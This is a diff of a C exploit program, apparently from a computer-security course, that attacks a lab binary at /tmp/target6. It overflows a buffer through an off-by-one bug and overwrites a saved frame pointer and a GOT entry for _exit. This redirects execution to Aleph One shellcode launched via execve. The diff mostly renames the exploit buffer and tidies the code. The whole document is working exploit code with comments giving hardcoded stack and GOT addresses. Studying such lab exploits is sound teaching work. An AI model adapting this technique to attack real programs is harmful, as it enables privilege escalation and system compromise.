@@ -5,37 +5,19 @@
 #include "shellcode.h"
 
 #define TARGET "/tmp/target6"
-#define STR_SIZE 208 /* size of exploit string */
+#define EGG_SIZE 208
 
-/* 
-   Useful addresses to know to understand the exploit: 
-   
-   During execution:
 
-   foo stack frame:
-      $fp = 0xBFFFFD68
-   bar stack frame:
-      $fp = 0xBFFFFD48
-   nstrcpy stack frame:
-      $fp = 0xBFFFFC58
-   
-   start address of buf local var in bar function: 0xBFFFFC80 
-*/
 
 int main(void)
 {
   char *args[3];
   char *env[1];
-
-  args[0] = TARGET; args[2] = NULL;
-  env[0] = NULL;
-
   long buffAddr, gotAddr, *addrPtr;
-  char exploitStr[STR_SIZE]; /* string containing exploit code */
-  char *ptr;
+  char egg[EGG_SIZE]; /* string containing exploit code */
   int i;
 
-  buffAddr = 0xBFFFFC80; /* start address of buf in target2.c:bar */
+  buffAddr = 0xBFFFFC80; /* start address of buf in target6.c:bar */
   gotAddr = 0x8049774; /* GOT address for _exit */
 
   /* First, fill the exploit string with the start address of the buf
@@ -44,8 +26,8 @@ int main(void)
      buf and hence the 'ret' instruction will pop off and insert 
      0xBFFFFC90 (the start address of buf) into eip. At that point 
      the shellcode will begin executing and we are done. */
-  addrPtr = (long *) exploitStr; 
-  for (i = 0; i < STR_SIZE; i += 4)
+  addrPtr = (long *) egg; 
+  for (i = 0; i < EGG_SIZE; i += 4)
      *(addrPtr++) = buffAddr;
   
   /* The check 'i <= len' inside the for loop in nstrcpy allows us
@@ -61,24 +43,23 @@ int main(void)
      start of the buffer) and hence the 'ret' call immediately after 
      will set eip equal to 0xBFFFFC80. 
 
-     Notice STR_SIZE - 8 is the 201 byte of the exploit string. This
+     Notice EGG_SIZE - 8 is the 201 byte of the exploit string. This
      is exactly the byte that will overwrite the LSB of the saved ebp
      for foo stack frame. */
-  exploitStr[STR_SIZE - 8] = 0x48;
+  egg[EGG_SIZE - 8] = 0x48;
 
   /* write GOT addr */
-  addrPtr = (long *)&exploitStr[STR_SIZE - 12];
+  addrPtr = (long *)&egg[EGG_SIZE - 12];
   *addrPtr = gotAddr; 
-
 
   /* Then fill the first bytes of the exploit string with
      Aleph One's shellcode */
-  ptr = exploitStr;
-  for (i = 0; i < strlen(shellcode); ++i)
-    ptr[i] = shellcode[i];
+  memcpy (egg, shellcode, strlen (shellcode));
 
-  exploitStr[STR_SIZE - 1] = 0; /* null terminate exploit string */
-  args[1] = exploitStr;
+  egg[EGG_SIZE - 1] = 0; /* null terminate exploit string */
+
+  args[0] = TARGET; args[1] = egg; args[2] = NULL;
+  env[0] = NULL;
 
   if (0 > execve(TARGET, args, env))
     fprintf(stderr, "execve failed.\n");
